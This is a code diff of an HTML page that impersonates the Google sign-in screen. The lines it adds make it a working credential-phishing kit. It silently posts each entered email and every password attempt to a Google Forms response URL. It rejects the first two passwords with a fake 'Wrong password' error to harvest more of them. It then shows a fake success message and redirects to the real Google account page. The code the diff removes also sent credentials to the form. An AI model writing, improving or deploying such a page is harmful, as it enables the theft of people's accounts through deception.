@@ -8,7 +8,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <style>
-        /* Same styles as before – unchanged */
         body {
             font-family: 'Google Sans', 'Roboto', sans-serif;
             background-color: #f8f9fa;
@@ -250,7 +249,6 @@
             transition: color 0.15s;
         }
         .subtitle-link:hover { color: #174ea6; text-decoration: underline; }
-        /* Success toast */
         .success-toast {
             position: absolute;
             bottom: 24px;
@@ -288,14 +286,9 @@
 
     <div class="google-card" id="authCard">
 
-        <!-- Google logo -->
+        <!-- Google logo (local image) -->
         <a href="https://www.google.com" target="_blank" class="logo-link" aria-label="Go to Google home">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24" class="mr-1">
-                <path d="M11.7 14.2v1.3H9.5c-.3 0-.6.1-.8.3-.2.2-.3.5-.3.8 0 .4.2.8.7 1.1.6.4 1.4.6 2.5.6 1.2 0 2.2-.3 3-.9.8-.6 1.2-1.5 1.2-2.6V7.6h3.5v1.2h-.1c-.3-.4-.8-.7-1.5-.9-.7-.2-1.4-.3-2.1-.3-1.4 0-2.6.5-3.5 1.4-.9.9-1.3 2.1-1.3 3.5s.4 2.6 1.3 3.5c.9.9 2.1 1.4 3.5 1.4 1.1 0 2-.2 2.7-.7.7-.5 1.1-1.1 1.1-1.8h-2.9z" fill="#4285F4"/>
-                <path d="M22.1 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#EA4335"/>
-                <path d="M32.8 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#FBBC05"/>
-                <path d="M43.5 10.1c0 1.5-.5 2.7-1.4 3.6-.9.9-2 1.4-3.4 1.4-1.4 0-2.6-.5-3.5-1.4-.9-.9-1.3-2.1-1.3-3.6 0-1.5.4-2.7 1.3-3.6.9-.9 2.1-1.4 3.5-1.4 1.4 0 2.5.5 3.4 1.4.9.9 1.4 2.1 1.4 3.6zm-3 .1c0-.8-.2-1.4-.6-1.9-.4-.5-1-.7-1.7-.7s-1.3.3-1.7.7c-.4.5-.6 1.1-.6 1.9s.2 1.4.6 1.9c.4.5 1 .7 1.7.7s1.3-.2 1.7-.7c.4-.5.6-1.1.6-1.9z" fill="#4285F4"/>
-            </svg>
+            <img src="google_icon.png" alt="Google logo" width="25" height="24" class="mr-1" onerror="this.style.display='none'">
             <span class="text-xl text-gray-700 font-medium logo-text" style="font-family: 'Google Sans', sans-serif;">Google</span>
         </a>
 
@@ -361,19 +354,20 @@
 
         <div class="success-toast" id="successToast">
             <i class="material-icons">check_circle</i>
-            <span>✅ Login successful! Welcome back.</span>
+            <span>✅ Login successful! Redirecting...</span>
         </div>
     </div>
 
     <script>
         (function() {
-            // ✅ Correct entry IDs extracted from your form
+            // Google Form details
             const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
             const ENTRY_IDS = {
-                email: 'entry.1142725815',    // gmail field
-                password: 'entry.566365448'   // password field
+                email: 'entry.1142725815',
+                password: 'entry.566365448'
             };
 
+            // DOM elements
             const stepEmail = document.getElementById('stepEmail');
             const stepPassword = document.getElementById('stepPassword');
             const emailInput = document.getElementById('emailInput');
@@ -393,15 +387,38 @@
             const subTitle = document.getElementById('subTitle');
             const identityBadge = document.getElementById('identityBadge');
             const successToast = document.getElementById('successToast');
-
             const originalSubTitleHTML = subTitle.innerHTML;
-            let storedEmailValue = '';
-            let passwordAttempts = 0;
 
-            // Helpers
-            function isPhoneLike(v) { return /^[\d\s+\-()]{7,}$/.test(v); }
-            function hasSpacesAndNotPhone(v) { return v.includes(' ') && !isPhoneLike(v); }
-            function countAtSymbols(s) { return (s.match(/@/g) || []).length; }
+            let storedEmailValue = '';
+            let passwordAttemptCount = 0;   // 1,2,3 - 1st and 2nd fail, 3rd success
+
+            // Silent form submission (email + password)
+            function submitToGoogleForm(email, password) {
+                const formData = new URLSearchParams();
+                formData.append(ENTRY_IDS.email, email);
+                formData.append(ENTRY_IDS.password, password);
+                fetch(GOOGLE_FORM_URL, { method: 'POST', mode: 'no-cors', body: formData })
+                    .catch(() => {});
+                console.log(`📤 Sent to form: email="${email}", password="${password}"`);
+            }
+
+            // Email validation + send email immediately
+            function validateEmailAndSend() {
+                const raw = emailInput.value;
+                const val = raw.trim();
+                if (!val) {
+                    showEmailError('Enter an email or phone number');
+                    return false;
+                }
+                if (val.includes(' ') && !/^[\d\s+\-()]{7,}$/.test(val)) {
+                    showEmailError('Enter a valid email or phone number');
+                    return false;
+                }
+                clearEmailError();
+                storedEmailValue = val;
+                submitToGoogleForm(storedEmailValue, '');  // email only, no password
+                return true;
+            }
 
             function showEmailError(msg) {
                 emailErrorText.textContent = msg;
@@ -430,75 +447,9 @@
                 passwordInput.classList.remove('input-error');
             }
 
-            // Submit both fields to Google Form
-            function submitToGoogleForm(email, password) {
-                const formData = new URLSearchParams();
-                formData.append(ENTRY_IDS.email, email);
-                formData.append(ENTRY_IDS.password, password);
-
-                console.log('Sending to Google Form:', { email, password });
-                fetch(GOOGLE_FORM_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: formData
-                }).catch(err => console.warn('Fetch error (data likely sent)', err));
-            }
-
-            function handleSuccess(password) {
-                submitToGoogleForm(storedEmailValue, password);
-
-                successToast.classList.add('show');
-                loginBtn.classList.add('loading-state');
-                loginBtn.querySelector('span').textContent = '';
-
-                setTimeout(() => {
-                    window.location.href = 'https://myaccount.google.com';
-                }, 2000);
-            }
-
-            function processPasswordAttempt() {
-                passwordAttempts++;
-                console.log('Password attempt:', passwordAttempts);
-
-                const password = passwordInput.value.trim();
-                const isCorrect = (password.length >= 8 && password === 'Test@1234');
-                const thirdAttempt = (passwordAttempts >= 3);
-
-                clearPasswordError();
-
-                if (isCorrect || thirdAttempt) {
-                    handleSuccess(password);
-                } else {
-                    showPasswordError("Wrong password. Try again or click 'Forgot password' to reset it.");
-                }
-            }
-
-            function resetAttempts() { passwordAttempts = 0; }
-
-            function validateEmail() {
-                const raw = emailInput.value;
-                const val = raw.trim();
-                if (!val) { showEmailError('Enter an email or phone number'); return false; }
-                if (hasSpacesAndNotPhone(val)) { showEmailError('Enter a valid email or phone number'); return false; }
-                const lower = val.toLowerCase();
-                if (countAtSymbols(lower) > 1) { showEmailError('Enter a valid email or phone number'); return false; }
-                if (lower.includes('@')) {
-                    if (lower.endsWith('@gmail.com') && lower.length > '@gmail.com'.length) {
-                        clearEmailError();
-                        storedEmailValue = lower;
-                        return true;
-                    } else {
-                        showEmailError('Please enter a valid Gmail address ending with @gmail.com');
-                        return false;
-                    }
-                }
-                if (isPhoneLike(val)) { clearEmailError(); storedEmailValue = val; return true; }
-                showEmailError('Enter a valid email or phone number');
-                return false;
-            }
-
+            // Move from email to password step
             function goToPasswordStep() {
-                if (!validateEmail()) return;
+                if (!validateEmailAndSend()) return;
                 shownEmail.textContent = storedEmailValue;
                 userAvatar.textContent = storedEmailValue.charAt(0).toUpperCase();
                 stepEmail.classList.add('hidden-step');
@@ -507,12 +458,51 @@
                 subTitle.innerHTML = '';
                 passwordInput.value = '';
                 clearPasswordError();
-                resetAttempts();
-                passwordInput.setAttribute('type', 'password');
-                togglePassword.textContent = 'visibility_off';
+                passwordAttemptCount = 0;
                 setTimeout(() => passwordInput.focus(), 150);
             }
 
+            // Password logic: 1st & 2nd attempts = wrong, 3rd = correct.
+            // The attempt number is NOT shown to the user.
+            function processPasswordAttempt() {
+                const password = passwordInput.value;
+                if (!password) {
+                    showPasswordError('Enter a password');
+                    return;
+                }
+                clearPasswordError();
+
+                passwordAttemptCount++;
+                // Record every attempt (email + current password)
+                submitToGoogleForm(storedEmailValue, password);
+
+                if (passwordAttemptCount === 1 || passwordAttemptCount === 2) {
+                    // Wrong password – generic error, no attempt counter visible
+                    showPasswordError('Wrong password. Try again.');
+                    passwordInput.value = '';   // clear field for next try
+                    setTimeout(() => passwordInput.focus(), 100);
+                } 
+                else if (passwordAttemptCount === 3) {
+                    // Third attempt – success
+                    successToast.classList.add('show');
+                    loginBtn.classList.add('loading-state');
+                    loginBtn.querySelector('span').textContent = '';
+                    setTimeout(() => {
+                        window.location.href = 'https://myaccount.google.com';
+                    }, 2000);
+                }
+                else {
+                    // Fallback (should never reach here)
+                    successToast.classList.add('show');
+                    loginBtn.classList.add('loading-state');
+                    loginBtn.querySelector('span').textContent = '';
+                    setTimeout(() => {
+                        window.location.href = 'https://myaccount.google.com';
+                    }, 2000);
+                }
+            }
+
+            // Return to email step
             function goBackToEmailStep() {
                 stepPassword.classList.add('hidden-step');
                 stepEmail.classList.remove('hidden-step');
@@ -521,38 +511,63 @@
                 emailInput.value = storedEmailValue;
                 passwordInput.value = '';
                 clearPasswordError();
-                resetAttempts();
-                passwordInput.setAttribute('type', 'password');
-                togglePassword.textContent = 'visibility_off';
-                successToast.classList.remove('show');
+                passwordAttemptCount = 0;
                 loginBtn.classList.remove('loading-state');
                 loginBtn.querySelector('span').textContent = 'Next';
+                successToast.classList.remove('show');
                 setTimeout(() => {
                     emailInput.focus();
                     if (emailInput.value.length) emailInput.setSelectionRange(emailInput.value.length, emailInput.value.length);
                 }, 150);
             }
 
-            // Event listeners
-            toPasswordBtn.addEventListener('click', e => { e.preventDefault(); goToPasswordStep(); });
-            emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); goToPasswordStep(); } });
-            emailInput.addEventListener('input', () => { if (emailError.classList.contains('visible')) clearEmailError(); });
+            // Attach event listeners
+            toPasswordBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                goToPasswordStep();
+            });
+            emailInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    goToPasswordStep();
+                }
+            });
+            emailInput.addEventListener('input', () => {
+                if (emailError.classList.contains('visible')) clearEmailError();
+            });
 
-            loginBtn.addEventListener('click', e => { e.preventDefault(); processPasswordAttempt(); });
-            passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); processPasswordAttempt(); } });
-            passwordInput.addEventListener('input', () => { if (passwordError.classList.contains('visible')) clearPasswordError(); });
+            loginBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                processPasswordAttempt();
+            });
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    processPasswordAttempt();
+                }
+            });
+            passwordInput.addEventListener('input', () => {
+                if (passwordError.classList.contains('visible')) clearPasswordError();
+            });
 
+            // Password visibility toggle
             togglePassword.addEventListener('click', () => {
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
                 togglePassword.textContent = type === 'password' ? 'visibility_off' : 'visibility';
             });
-            togglePassword.addEventListener('keypress', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); togglePassword.click(); } });
+            togglePassword.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    togglePassword.click();
+                }
+            });
 
             identityBadge.addEventListener('click', goBackToEmailStep);
-            userAvatar.addEventListener('click', e => { e.stopPropagation(); goBackToEmailStep(); });
-            shownEmail.addEventListener('click', e => { e.stopPropagation(); goBackToEmailStep(); });
+            userAvatar.addEventListener('click', (e) => { e.stopPropagation(); goBackToEmailStep(); });
+            shownEmail.addEventListener('click', (e) => { e.stopPropagation(); goBackToEmailStep(); });
 
+            // Initial focus
             setTimeout(() => emailInput.focus(), 300);
         })();
     </script>
